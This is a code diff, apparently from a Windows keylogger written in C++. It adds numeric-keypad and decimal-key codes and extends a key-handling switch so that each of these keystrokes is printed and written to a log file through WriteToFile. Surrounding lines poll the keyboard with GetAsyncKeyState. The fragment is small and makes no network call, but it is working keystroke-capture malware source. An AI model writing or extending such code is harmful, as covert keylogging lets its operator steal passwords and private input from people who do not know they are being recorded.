@@ -32,6 +32,17 @@
 #define VK_OEM_1 0xBA;
 #define VK_DIVIDE 0x6F;
 #define VK_SUBTRACT 0x6D;
+#define VK_DECIMAL 0x6E; 
+#define VK_NUMPAD0 0x60;
+#define VK_NUMPAD1 0x61;
+#define VK_NUMPAD2 0x62;
+#define VK_NUMPAD3 0x63;
+#define VK_NUMPAD4 0x64;
+#define VK_NUMPAD5 0x65;
+#define VK_NUMPAD6 0x66;
+#define VK_NUMPAD7 0x67;
+#define VK_NUMPAD8 0x68;
+#define VK_NUMPAD9 0x69;
 
 
 
@@ -304,7 +315,6 @@ bool Key_is_Listed(WORD iKey)
 		}
 		break;
 
-
 	case 90:
 		if (GetAsyncKeyState(0xA0))
 		{
@@ -313,6 +323,63 @@ bool Key_is_Listed(WORD iKey)
 		}
 		break;
 
+
+
+
+	case 0x60:
+		std::cout << "0";
+		WriteToFile("0");
+		break;
+
+	case 0x61:
+		std::cout << "1";
+		WriteToFile("1");
+		break;
+
+	case 0x62:
+		std::cout << "2";
+		WriteToFile("2");
+		break;
+
+	case 0x63:
+		std::cout << "3";
+		WriteToFile("3");
+		break;
+
+	case 0x64:
+		std::cout << "4";
+		WriteToFile("4");
+		break;
+
+	case 0x65:
+		std::cout << "5";
+		WriteToFile("5");
+		break;
+
+	case 0x66:
+		std::cout << "6";
+		WriteToFile("6");
+		break;
+
+	case 0x67:
+		std::cout << "7";
+		WriteToFile("7");
+		break;
+
+	case 0x68:
+		std::cout << "8";
+		WriteToFile("8");
+		break;
+
+	case 0x69:
+		std::cout << "9";
+		WriteToFile("9");
+		break;
+
+	case 0x6E:
+		std::cout << ".";
+		WriteToFile(".");
+		break;
 
 	case 0x6D:
 		std::cout << "-";
